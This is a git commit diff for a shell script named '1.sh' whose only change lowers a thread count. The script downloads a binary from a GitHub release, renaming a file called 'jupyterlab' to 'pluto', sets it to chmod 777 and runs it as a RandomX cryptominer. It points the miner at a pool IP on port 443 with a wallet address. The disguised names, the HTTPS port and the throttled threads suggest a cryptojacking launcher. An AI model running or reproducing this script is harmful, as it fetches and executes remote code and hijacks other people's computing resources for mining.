a1113bc19073bfd7395a4cf65b020809882e7534
Shin <dirianda187@gmail.com>
2026-07-07 08:54:26 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,4 +1,4 @@
 cd
 curl -s -L -o pluto https://github.com/Dirianda12/mainble/releases/download/mx/jupyterlab
 chmod 777 pluto
-./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p ver1 -t 3
+./pluto -a randomx -o 185.84.98.5:443 -u 876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy -p ver1 -t 2
